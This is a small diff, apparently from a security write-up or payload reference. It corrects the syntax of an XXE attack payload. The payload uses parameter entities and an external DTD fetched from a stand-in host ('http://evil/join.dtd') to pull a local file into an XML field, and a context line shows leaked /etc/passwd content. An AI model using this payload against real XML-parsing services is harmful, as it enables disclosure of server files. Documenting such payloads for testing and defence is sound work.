@@ -98,11 +98,11 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ```
 <!DOCTYPE updateProfile [
   <!ENTITY % file SYSTEM "file:///has/broken/xml">
-  <!ENTITY % start "<![CDATA[">
-  <!ENTITY % end "]]>">
+  <!ENTITY % start "<![CDATA[" >
+  <!ENTITY % end "]]>" >
   <!ENTITY % dtd SYSTEM "http://evil/join.dtd">
   %dtd;
-]]>
+]>
 ...
 <lastname>&all;</lastname>
 
